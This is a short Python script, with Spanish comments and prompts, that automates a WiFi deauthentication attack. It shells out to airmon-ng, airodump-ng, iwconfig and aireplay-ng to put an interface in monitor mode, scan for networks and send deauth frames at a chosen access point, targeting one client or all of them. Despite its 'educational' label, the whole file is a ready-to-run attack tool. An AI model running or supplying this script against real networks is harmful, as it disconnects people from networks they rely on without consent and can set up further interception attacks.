import os
import time

def ejecutar(comando):
    print(f"\n[+] Ejecutando: {comando}")
    os.system(comando)

print("=== Script Deauth WiFi (educativo y controlado) ===")

# Paso 1: Matar procesos molestos
ejecutar("airmon-ng check kill")

# Paso 2: Modo monitor
interfaz = input("Nombre de tu interfaz WiFi (ej: wlan0): ")
ejecutar(f"airmon-ng start {interfaz}")
interfaz_mon = interfaz

# Paso 3: Escaneo de redes
print("\n[!] Abriendo airodump-ng para escanear redes. Cerrá con Ctrl+C cuando encuentres tu red.")
time.sleep(3)
ejecutar(f"airodump-ng {interfaz_mon}")

# Paso 4: Selección de red objetivo
bssid = input("BSSID de la red (MAC): ")
canal = input("Canal de la red (ej: 6): ")

# Paso 5: Fijar canal
ejecutar(f"iwconfig {interfaz_mon} channel {canal}")

# Paso 6: Ataque de deautenticación
cliente = input("MAC del cliente (dejar vacío para atacar a todos): ")
if cliente.strip() == "":
    ejecutar(f"aireplay-ng --deauth 10 -a {bssid} {interfaz_mon}")
else:
    ejecutar(f"aireplay-ng --deauth 10 -a {bssid} -c {cliente} {interfaz_mon}")

# Paso 7: Apagar modo monitor (opcional)
restaurar = input("¿Querés apagar el modo monitor? (s/n): ")
if restaurar.lower() == "s":
    ejecutar(f"airmon-ng stop {interfaz_mon}")
    print("[+] Interfaz restaurada a modo normal.")

print("\n[✓] Proceso finalizado. Usalo con responsabilidad.")
